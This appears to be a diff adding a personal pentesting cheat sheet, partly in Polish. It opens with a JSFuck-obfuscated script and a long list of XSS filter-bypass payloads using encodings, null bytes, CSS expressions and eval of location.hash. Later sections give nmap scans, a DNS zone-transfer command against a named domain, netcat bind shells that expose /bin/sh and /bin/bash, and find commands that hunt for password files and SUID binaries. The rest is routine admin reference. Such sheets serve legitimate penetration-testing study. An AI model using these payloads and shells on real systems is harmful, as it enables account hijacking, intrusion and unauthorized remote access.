+<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
+
+
+
+Exotic payloads
+
+<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
+<script>$=1,alert($)</script>
+<script ~~~>confirm(1)</script ~~~> 
+<script>$=1,\u0061lert($)</script>
+<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
+<</script/script><script ~~~>\u0061lert(1)</script ~~~>
+</style></scRipt><scRipt>alert(1)</scRipt>
+<img/id="alert&lpar;&#x27;XSS&#x27;&#x29;\"/alt=\"/\"src=\"/\"onerror=eval(id&#x29;>
+<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
+<svg><x><script>alert&#40;&#39;1&#39;&#41</x>
+<iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
+
+
+                                                                    
+Simple character manipulations.  
+Note that I use hexadecimal to represent characters that you probably can't type.  For example, \x00 equals a null byte, but you'll need to encode this properly depending on the context (URL encoding \x00 = %00).
+
+HaRdc0r3 caS3 s3nsit1vITy bYpa55!
+<sCrIpt>alert(1)</ScRipt>
+<iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)>
+
+Null-byte character between HTML attribute name and equal sign (IE, Safari).
+<img src='1' onerror\x00=alert(0) />
+
+Slash character between HTML attribute name and equal sign (IE, Firefox, Chrome, Safari).
+<img src='1' onerror/=alert(0) />
+
+Vertical tab between HTML attribute name and equal sign (IE, Safari).
+<img src='1' onerror\x0b=alert(0) />
+
+Null-byte character between equal sign and JavaScript code (IE).
+<img src='1' onerror=\x00alert(0) />
+
+Null-byte character between characters of HTML attribute names (IE).
+<img src='1' o\x00nerr\x00or=alert(0) />
+
+Null-byte character before characters of HTML element names (IE).
+<\x00img src='1' onerror=alert(0) />
+
+Null-byte character after characters of HTML element names (IE, Safari).
+<script\x00>alert(1)</script>
+
+Null-byte character between characters of HTML element names (IE).
+<i\x00mg src='1' onerror=alert(0) />
+
+Use slashes instead of whitespace (IE, Firefox, Chrome, Safari).
+<img/src='1'/onerror=alert(0)>
+
+Use vertical tabs instead of whitespace (IE, Safari).
+<img\x0bsrc='1'\x0bonerror=alert(0)>
+
+Use quotes instead of whitespace in some situations (Safari).
+<img src='1''onerror='alert(0)'>
+<img src='1'"onerror="alert(0)">
+
+Use null-bytes instead of whitespaces in some situations (IE).
+<img src='1'\x00onerror=alert(0)>
+
+Just don't use spaces (IE, Firefox, Chrome, Safari).
+<img src='1'onerror=alert(0)>
+
+Prefix URI schemes.
+Firefox (\x09, \x0a, \x0d, \x20)
+Chrome (Any character \x01 to \x20)
+<iframe src="\x01javascript:alert(0)"></iframe> <!-- Example for Chrome -->
+
+No greater-than characters needed (IE, Firefox, Chrome, Safari).
+<img src='1' onerror='alert(0)' <
+
+Extra less-than characters (IE, Firefox, Chrome, Safari).
+<<script>alert(0)</script>
+
+Backslash character between expression and opening parenthesis (IE).
+<style>body{background-color:expression\(alert(1))}</style>
+
+JavaScript Escaping
+<script>document.write('<a hr\ef=j\avas\cript\:a\lert(2)>blah</a>');</script>
+
+Encoding Galore.
+
+HTML Attribute Encoding
+<img src="1" onerror="alert(1)" />
+<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
+<iframe src="javascript:alert(1)"></iframe>
+<iframe src="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;"></iframe>
+
+URL Encoding
+<iframe src="javascript:alert(1)"></iframe>
+<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
+
+CSS Hexadecimal Encoding (IE specific examples)
+<div style="x:expression(alert(1))">Joker</div>
+<div style="x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))">Joker</div>
+<div style="x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))">Joker</div>
+<div style="x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029">Joker</div>
+
+JavaScript (hexadecimal, octal, and unicode)
+<script>document.write('<img src=1 onerror=alert(1)>');</script>
+<script>document.write('\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x31\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x61\x6C\x65\x72\x74\x28\x31\x29\x3E');</script>
+<script>document.write('\074\151\155\147\040\163\162\143\075\061\040\157\156\145\162\162\157\162\075\141\154\145\162\164\050\061\051\076');</script>
+<script>document.write('\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0031\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029\u003E');</script>
+
+JavaScript (Decimal char codes)
+<script>document.write('<img src=1 onerror=alert(1)>');</script>
+<script>document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,49,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,48,41,62));</script>
+
+JavaScript (Unicode function and variable names)
+<script>alert(123)</script>
+<script>\u0061\u006C\u0065\u0072\u0074(123)</script>
+
+Overlong UTF-8 (SiteMinder is awesome!)
+< = %C0%BC = %E0%80%BC = %F0%80%80%BC
+> = %C0%BE = %E0%80%BE = %F0%80%80%BE
+' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
+" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
+
+<img src="1" onnerror="alert(1)">
+%E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE
+
+UTF-7 (Missing charset?)
+<img src="1" onerror="alert(1)" />
++ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
+
+Unicode .NET Ugliness
+<script>alert(1)</script>
+%uff1cscript%uff1ealert(1)%uff1c/script%uff1e
+
+Classic ASP performs some unicode homoglyphic translations... don't ask why...
+<img src="1" onerror="alert('1')">
+%u3008img%20src%3D%221%22%20onerror%3D%22alert(%uFF071%uFF07)%22%u232A
+
+Useless and/or Useful features.
+
+HTML 5 (Not comphrensive)
+<video src="http://www.w3schools.com/html5/movie.ogg" onloadedmetadata="alert(1)" />
+<video src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)" />
+
+Usuage of non-existent elements (IE)
+<blah style="blah:expression(alert(1))" />
+
+CSS Comments (IE)
+<div style="z:exp/*anything*/res/*here*/sion(alert(1))" />
+
+Alternate ways of executing JavaScript functions
+<script>window['alert'](0)</script>
+<script>parent['alert'](1)</script>
+<script>self['alert'](2)</script>
+<script>top['alert'](3)</script>
+
+Split up JavaScript into HTML attributes
+<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
+
+HTML is parsed before JavaScript
+<script>
+var junk = '</script><script>alert(1)</script>';
+</script>
+
+HTML is parsed before CSS
+<style>
+body { background-image:url('http://www.blah.com/</style><script>alert(1)</script>'); }
+</style>
+
+XSS in XML documents [doctype = text/xml] (Firefox, Chrome, Safari).
+<?xml version="1.0" ?>
+<someElement>
+	<a xmlns:a='http://www.w3.org/1999/xhtml'><a:body onload='alert(1)'/></a>
+</someElement>
+
+URI Schemes
+<iframe src="javascript:alert(1)"></iframe>
+<iframe src="vbscript:msgbox(1)"></iframe> (IE)
+<iframe src="data:text/html,<script>alert(0)</script>"></iframe> (Firefox, Chrome, Safari)
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe> (Firefox, Chrome, Safari)
+
+HTTP Parameter Pollution
+http://target.com/something.xxx?a=val1&a=val2
+ASP.NET 	a = val1,val2
+ASP 		a = val1,val2
+JSP 		a = val1
+PHP 		a = val2
+
+Two Stage XSS via fragment identifier (bypass length restrictions / avoid server logging)
+<script>eval(location.hash.slice(1))</script>
+<script>eval(location.hash)</script> (Firefox)
+
+http://target.com/something.jsp?inject=<script>eval(location.hash.slice(1))</script>#alert(1)
+
+Two Stage XSS via name attribute
+<iframe src="http://target.com/something.jsp?inject=<script>eval(name)</script>" name="alert(1)"></iframe>
+
+Non-alphanumeric crazyness...
+<script>
+$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();
+</script>
+
+<script>
+(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
+</script>
+
+###############################################################################
+{netstat}
+###############################################################################
+
+listening ports and current connections
+
+C\> netstat -ano  
+$ netstat -tunp   (Linux)
+$ netstat -p tcp -p udp   (OXS)
+$ lsof -n -i4TCP -i4UDP   (OSX)
+
+
+###############################################################################
+{arp}
+###############################################################################
+
+Address Resolution Protocol
+
+sprawdzenie ARP cache:
+
+$ arp           (*NIX)
+$ ip neighbour  (Linux)
+C\> arp -a      (Windows)
+
+
+
+###############################################################################
+{links}
+###############################################################################
+
+Windows VMs
+https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
+
+###############################################################################
+{Apple}{OSX}
+###############################################################################
+
+defaults write -g AppleShowAllFiles -bool true
+
+###############################################################################
+{dig}
+###############################################################################
+
+zone transfer (I serwera DNS, domena, -t AXFR):
+dig @67.210.98.2 christinelingerie.com -t AXFR
+
+zapytanie o IPv6
+dig @8.8.8.8 AAAA heppin.com
+
+###############################################################################
+{nmap}
+###############################################################################
+
+xmas (FIN/PSH/URG),null(without flags):
+nmap -sX -p- -PN 192.168.1.2
+nmap -sN -p- -PN 192.168.1.2
+
+skanowanie UDP:
+nmap -sU 192.168.1.2
+
+skanowanie SYN (default):
+nmap -sS -p- -PN 192.168.1.2
+
+TCP (full connection):
+nmap -sT -p- -PN 192.168.1.2
+
+
+host discovery:
+nmap -sn 192.168.1.1-100
+
+quiet host discovery:
+nmap -sn -PE --send-ip 192.168.1.1-100
+nmap -sn -PM --send-ip 192.168.1.1-100
+
+nmap -sS -Pn -p 22 --open 192.168.1.1-100
+
+host discovery with ICMP TIMESTAMP (dobre!):
+nmap -sn -PP --send-ip 192.168.1.1-100
+
+check OS; scan IPs from file (file - one IP per line)
+nmap -O -iL ip_adresses.txt 
+
+TCP ACK ping: (-n - no DNS resolution)
+nmap -PA -iL ip_adresses.txt
+nmap -PA -iL ip_adresses.txt --traceroute -n
+
+PING scanning
+nmap -sP 192.168.1.100
+
+skanowanie IPv6
+nmap -6 ::1     (::1 = localhost w IPv6)
+
+
+OPTIONS:
+-A                  skanowanie, identyfikacja usług, skrypty - wszystko
+-sUT                skanowanie TCP + UDP
+-sV                 version of service
+-O                  version of OS
+-p 1-100            port(s)
+192.168.1.1-10      IPs range
+--top-ports=20      najpopularniejsze porty
+-p-                 cały zakres portów
+--reason            wyjaśnienie open|filtered|closed
+-F                  "fast" - szybkie, 100 najpopularniejszych portów
+-T3                 szybkość skanowania; 3 - domyślnie; 4 - szybciej, 2 - wolniej
+-n                  bez rozwiązywania nazw DNS
+-g 80               ustawienie portu źródłowego skanowania (tu: z portu HTTP)
+-o                  zapis do pliku (-oN, -oA)
+--ip-options="..."  ustawianie opcji pakietu IP (--ip-options="R" - record route)
+--packet-trace      pokaż route pakietów (odpowiednik traceroute) 
+-sC                 script scanning
+--script scriptname skanowanie z użyciem skryptów NSE
+
+###############################################################################
+{ssh-keygen}
+###############################################################################
+
+cd ~/.ssh
+ssh-keygen [podajemy passphrase, min. 4 znaki]
+
+cat id_rsa.pub [kopiujemy i wklejamy w ustawieniach konta: dodajemy klucz]
+ssh-add ~/.ssh/id_rsa
+
+vim ~/.ssh/config [wklejamy (tresc pliku 'config'):]
+
+###############################################################################
+{openssl}
+###############################################################################
+
+podlaczenie do zdalnego hosta na 443 po SSL
+$ openssl s_client -connect hack.me:443 -debug -state
+
+###############################################################################
+{fping}
+###############################################################################
+
+ping for multiple host(s)
+
+fping -a -e -C 1 -g 192.168.1.1/24
+fping -a -e -C 1 -g 192.168.1.1 192.168.1.10
+
+###############################################################################
+{netcat}
+###############################################################################
+
+Netcat, or nc, is a self-described networking Swiss Army knife. It’s a very 
+simple but also very powerful and versatile application that allows you 
+to create arbitrary network connections. Here we see it being used as a port 
+scanner:
+
+$ nc -z example.com 20-100 
+Connection to example.com 22 port [tcp/ssh] succeeded! 
+Connection to example.com 80 port [tcp/http] succeeded!
+
+In addition to creating arbitrary connections, Netcat can also listen for 
+incoming connections. Here we use this feature of nc, combined with tar, to very 
+quickly and efficiently copy files between servers. On the server, run:
+
+$ nc -l 9090 | tar -xzf -
+
+And on the client:
+$ tar -czf dir/ | nc server 9090
+
+We can use Netcat to expose any application over the network. Here we expose 
+a shell over port 8080:
+$ mkfifo backpipe 
+$ nc -l 8080 0<backpipe | /bin/bash > backpipe
+
+We can now access the server from any client:
+$ nc example.com 8080
+uname -a 
+Linux li228-162 2.6.39.1-linode34 ##1 SMP Tue Jun 21 10:29:24 EDT 2011 i686 
+GNU/Linux
+
+While the last two examples are slightly contrived (in reality you’d be more 
+likely to use tools such as rsync to copy files and SSH to remotely access 
+a server), they do show the power and flexibility of Netcat, and hint at all 
+of the different things you can achieve by combining Netcat with other 
+applications.
+
+reverse shell:
+nc -l 4444 -e /bin/sh
+
+listening:
+nc -l 2323
+
+transfer plików:
+
+Client -> Server
+HOST (server):
+nc -l 2222 > to_write.txt
+
+CLIENT:
+nc 127.0.0.1 2222 < content_to_write.txt 
+
+Server -> Client
+SERVER:
+nc -l 2222 < console-toolbox.txt 
+
+CLIENT
+nc 127.0.0.1 2222 > to_write.txt
+
+
+###############################################################################
+{MySQL}
+###############################################################################
+
+utworzyc plik logow (!!!)
+
+sudo touch /var/log/mysql/mysql.log
+sudo chown _mysql /var/log/mysql/mysql.log
+
+
+w pliku my.cnf:
+
+# Be aware that this log type is a performance killer.
+# As of 5.1 you can enable the log at runtime!
+general_log_file        = /var/log/mysql/mysql.log
+general_log             = 1
+
+restart srevera MySQL:
+
+cd /usr/local/mysql-5.6.11-osx10.7-x86_64/support-files
+sudo ./mysql.server stop
+sudo ./mysql.server start
+
+
+execute shell in MySQL client:
+
+mysql> \! ls -l
+
+
+###############################################################################
+{mnt}{USB}
+###############################################################################
+
+root@bl4de:/home/rafal# mkdir -p /mnt/sdb1
+root@bl4de:/home/rafal#  mount -t auto /dev/sdb1 /mnt/sdb1
+root@bl4de:/home/rafal# cd /mnt/sdb1
+root@bl4de:/mnt/sdb1# ll
+razem 0
+root@bl4de:/mnt/sdb1# 
+
+###############################################################################
+{grep}
+###############################################################################
+
+grep [options] pattern <file>
+
+options:
+-i ignores casing
+-v invert-match. Returns lines that do NOT match provided pattern(s)
+-E extended regex. Interprets the pattern as a regular expression
+-f <file-path> Matches all patterns within the specified file (one per line)
+-b <number> Prints the number of lines before the match and the matching line
+-a <number> Prints the number of lines after the match and the matching line
+-R,-r Recursively search for the pattern in all files under the current directory.
+-n display line numbers
+-w use wildcards:
+$ grep -w Linu. file.txt (finds Linux, Linup, Linus and so on)
+$ grep -w '[lL]inux' filename (uses brakets expressions)
+
+
+--color pattern display in color
+
+$ grep -e ^i[mg] *.py -n --color -C2
+  cracker.py-5-
+  cracker.py-6-# module imports
+  cracker.py:7:import hashlib
+  cracker.py:8:import sys
+  cracker.py-9-
+  cracker.py-10-# function definitons
+
+-Cn	prints the number of preceding and following lines that you specify, eg. -nC4
+-Bn to print your desired number of lines before your match, and 
+-An after.
+
+###############################################################################
+{cut}
+###############################################################################
+
+cut -f<fields> [-d'<delimeter>’] [/path/to/input/file]
+
+1) first part of string before first / occurence
+
+$ cat XSS_remote.txt | cut -d'/' -f 1
+
+
+###############################################################################
+{find}
+###############################################################################
+
+a) blade@sword:~/github/jquery$ find .  -name \*.js -type f -print0 | xargs -0 grep -n -e "removeChild"
+b) find directory_name -type f -print0 | xargs -0 grep -li word
+
+c) find . -name *.log -print0 | xargs -0 -I __arg grep -n "fatal error:"  __arg | tee headers.txt
+
+(b) find is a general purpose directory walker/lister, -type f means "look for plain files rather than directories and named pipes and what have you", -print0 means "print them on the standard output using null characters as delimiters". The output from find is sent to xargs -0 and that grabs its standard input in chunks (to avoid command line length limitations) using null characters as a record separator (rather than the standard newline) and the applies grep -li word to each set of files. On the grep, -l means "list the files that match" and -i means "case insensitive"; you can usually combine single character options so you'll see -li more often than -l -i.
+
+If you don't use -print0 and -0 then you'll run into problems with file names that contain spaces so using them is a good habit.
+
+http://stackoverflow.com/questions/4121803/how-can-i-use-grep-to-find-a-word-inside-a-folder
+
+Unix ‘find’ Cheat Sheet
+Finding files by extension
+find / -name \*.pdf
+find / -name \*.pdf -o -name \*.doc -o -name \*.txt
+find / -type f -name \*.pdf -o -name \*.doc -o -name \*.txt
+
+On GNU-based versions of find use -iname for case insensitive search:
+find / -type f -iname \*.pdf -o -iname \*.doc -o -iname \*.txt
+
+Finding files by filename
+find / -name \*pass\*
+find / -name \*pass\* -o -name \*user\*
+
+On GNU-based versions of find use -iname for case insensitive search:
+find / -name \*pass\*
+Find config files that are world writeable:
+find / -name \*.conf -perm +0002
+
+Find suid/sgid programs
+suid progs:
+find / -type f -perm +2000 -ls
+sgid progs:
+find / -type f -perm +4000 -ls
+suid or sgid progs:
+find / -type f -perm +6000 -ls
+
+Find group writeable directories
+Find files that are world writeable
+directories:
+find / -type d -perm +0002 -ls
+
+world writeable directories with sticky bit
+find / -type d -perm +0002 -a -perm +1000 -ls
+
+world writeable directories without sticky bit
+find / -type d -perm +0002 -a -not -perm +1000 -ls
+
+###############################################################################
+{tcpdump}
+###############################################################################
+
+tcpdump -i wlan0 -vv -w tmp/logfile - podsluch na interfejsie wlan0, zapis do pliku
+
+`-v', `-vv' i `-vvv'
+    służą do coraz dokładniejszego analizowania zawartości pakietu
+`-t', `-tt', `-ttt' i `-tttt'
+    powodują coraz dokładniejsze określenie czasu
+`-x', `-tt', `-ttt' i `-tttt'
+    zawartość pakietu prezentowana jest w postaci heksdecymalnej
+`-X'
+    zawartość pakietu prezentowana jest w postaci ASCII
+
+Aby zalogować pakiety TCP z hosta 192.168.1.10, skierowane do portu 80 możesz napisać:
+tcpdump -i xl0 -w /tmp/zrzut03.dmp src 192.168.1.10 and tcp dst port 80 
+
